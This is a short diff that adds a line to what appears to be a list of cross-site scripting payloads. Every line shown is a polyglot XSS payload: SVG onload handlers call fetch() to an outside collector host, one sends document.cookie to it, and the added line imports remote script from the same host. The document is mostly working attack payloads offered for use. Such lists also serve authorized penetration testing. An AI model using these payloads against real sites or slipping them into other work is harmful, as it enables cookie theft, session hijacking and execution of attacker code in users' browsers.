@@ -8,3 +8,4 @@ javascript://</script></textarea></style></noscript></noembed></script></templat
 '"<svg/onload='var a="fetch";var b="https://xss.report/c/hnterx"; setTimeout(a+"(b)",1000)'>
 '"><script>'/*'/*`/*--><svg onload=fetch("https://xss.report/c/hnterx")></script>
 '"?><svg/onload="fetch('https://xss.report/c/hnterx?cookie='+document.cookie)"//>
+'"><Svg Src=//xss.report/c/hnterx/s OnLoad=import(this.getAttribute('src')+0)>
